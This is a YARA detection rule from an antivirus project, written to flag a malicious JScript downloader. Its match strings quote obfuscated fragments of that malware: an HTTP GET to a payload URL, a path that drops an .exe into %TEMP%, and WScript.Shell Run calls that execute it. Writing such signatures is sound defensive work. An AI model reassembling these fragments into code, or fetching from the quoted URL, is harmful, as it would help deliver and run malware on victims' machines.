rule sig_20160328_424befecbd692ba484d15a453f715d01 {
  meta:
    description = "datamaliciousorder - file 20160328_424befecbd692ba484d15a453f715d01.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3a512778eb0be1f67c83a445a1fd335f4dd9752c732245b8256096a61a4b8523"

  strings:
    $s1  = "function Xwtzbvdkzp() {return Aacto[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Dv8SbJw7pq.exe\";};" fullword ascii
    $s2  = "Fevftpcpun[Cgtfd](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Gyqfx](Faipyk() * 11)} while (Fevftpcpun[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Aacto = function Axbmfg() {return WScript[Adpfxb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Tgkanl(Nfyvsinl, Lyuth){return Nfyvsinl - Lyuth;};" fullword ascii
    $s6  = "function Yzmqgmctg() {return ((Gdcqnrvwr == true) && (Gdcqnrvwr == Yzkpjt)) ? 1 : Imrgi;};" fullword ascii
    $s7  = "function Pwcjeuqwpq(Dehon){Aacto[\"Run\"](Dehon, Imrgi, Imrgi);};" fullword ascii
    $s8  = "function Luscb(){return Adpfxb;};" fullword ascii
    $s9  = "Yzkpjt = true; " fullword ascii
    $s10 = "Gdcqnrvwr = true; " fullword ascii
    $s11 = "return Tgkanl(Bvxyn, Xtfmcrsemb);" fullword ascii
    $s12 = "var Yzkpjt = false;" fullword ascii
    $s13 = "var Gdcqnrvwr = false;" fullword ascii
    $s14 = "var Tjsrvbyi = new this[\"Date\"]();" fullword ascii
    $s15 = "function Udgyjrnxu(Rbofzkedo) {var Nlozus = (1, 2, 3, 4, 5, Rbofzkedo); return Nlozus;};" fullword ascii
    $s16 = "function Zpmpxkcwy()" fullword ascii
    $s17 = "function Mrnsu(){return Ogyviumigu;};" fullword ascii
    $s18 = "var Umsmfyg = false;" fullword ascii
    $s19 = "function Faipyk(){return 22;};" fullword ascii
    $s20 = " while (Htgxqeewqu){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}